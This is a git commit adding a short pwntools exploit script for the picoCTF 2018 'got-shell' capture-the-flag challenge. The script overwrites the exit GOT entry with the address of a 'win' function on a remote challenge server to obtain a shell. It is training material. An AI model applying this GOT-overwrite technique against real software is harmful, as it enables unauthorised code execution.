b01abbd198e06e9f09e555907f6dad8e4a0976a5
HuangPayoung <45514933+HuangPayoung@users.noreply.github.com>
2021-07-25 22:44:41 +0800

    Add files via upload

---
+++ BUUCTF/pwn/picoctf_2018_got_shell/exp.py
@@ -0,0 +1,12 @@
+from pwn import *
+
+context(os = 'linux', arch = 'amd64', log_level = 'debug')
+# io = process('PicoCTF_2018_got-shell')
+io = remote('node4.buuoj.cn', 26545)
+elf = ELF('PicoCTF_2018_got-shell')
+exit_got = elf.got['exit']
+win = elf.sym['win']
+
+io.sendlineafter('Where would you like to write this 4 byte value?\n', hex(exit_got))
+io.sendlineafter('Okay, now what value would you like to write to ' + hex(exit_got) + '\n', hex(win))
+io.interactive()
